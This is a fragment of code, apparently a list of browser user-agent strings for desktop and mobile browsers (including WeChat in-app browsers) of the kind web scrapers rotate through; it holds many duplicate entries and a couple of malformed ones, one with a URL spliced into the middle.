     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
